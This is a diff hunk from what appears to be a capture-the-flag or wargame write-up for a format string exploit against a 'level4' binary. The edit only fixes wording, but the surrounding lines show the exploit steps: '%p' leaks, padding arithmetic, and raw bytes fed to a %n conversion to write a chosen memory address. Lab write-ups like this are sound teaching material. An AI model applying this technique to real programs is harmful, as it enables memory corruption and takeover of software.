@@ -72,7 +72,7 @@ python -c 'import sys; sys.stdout.write("%p" * 11)' >> /tmp/input
 cat /tmp/input | ./level4 | wc -c 
 110
 
-110 have been printed: 21828 - 110 = 21718
+110 chars have been printed: 21828 - 110 = 21718
 We need to print 21718 chars of padding, popping the first argument from the buffer, and write to memory (second):
 /bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion
 /bin/echo -ne '\x10\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion
